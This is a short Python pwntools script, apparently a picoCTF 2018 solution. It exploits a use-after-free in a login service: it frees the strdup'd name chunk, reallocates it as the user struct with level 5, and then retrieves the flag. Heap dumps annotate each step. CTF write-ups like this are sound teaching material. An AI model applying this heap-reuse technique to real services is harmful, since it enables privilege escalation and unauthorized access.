from pwn import *

p = remote('2018shell2.picoctf.com', 29508)

p.sendline('login ' + '\x05' * 9)

# first malloc allocates 16 bytes chunk (the size of user struct)
# then strdup allocates a chunk (min size is 16) for our input

# 0x604010:	0x0000000000000000	0x0000000000000021 <== malloc
# 0x604020:	0x0000000000604040	0x0000000000000000 <== struct user: name level
# 0x604030:	0x0000000000000000	0x0000000000000021 <== strdup
# 0x604040:	0x0505050505050505	0x0000000000000005 <== arg
# 0x604050:	0x0000000000000000	0x0000000000020fb1
# 0x604060:	0x0000000000000000	0x0000000000000000

p.sendline('reset')

# then if we reset then program free strdup chunk 0x604040

# 0x604010:	0x0000000000000000	0x0000000000000021
# 0x604020:	0x0000000000604040	0x0000000000000000 <== struct user: name level
# 0x604030:	0x0000000000000000	0x0000000000000021
# 0x604040:	0x0000000000000000	0x0000000000000005 <== arg (free now)
# 0x604050:	0x0000000000000000	0x0000000000020fb1
# 0x604060:	0x0000000000000000	0x0000000000000000

p.sendline('login sploitem')

# then if we login, malloc returns chunk from fastbin - 0x604040

# 0x604010:	0x0000000000000000	0x0000000000000021
# 0x604020:	0x0000000000604040	0x0000000000000000 
# 0x604030:	0x0000000000000000	0x0000000000000021 <== malloc return this
# 0x604040:	0x0000000000000000	0x0000000000000005 <== struct user: name level
# 0x604050:	0x0000000000000000	0x0000000000020fb1
# 0x604060:	0x0000000000000000	0x0000000000000000

p.sendline('get-flag')

# and our level is 5 now, we can call get-flag

print p.recvuntil('}')

p.close()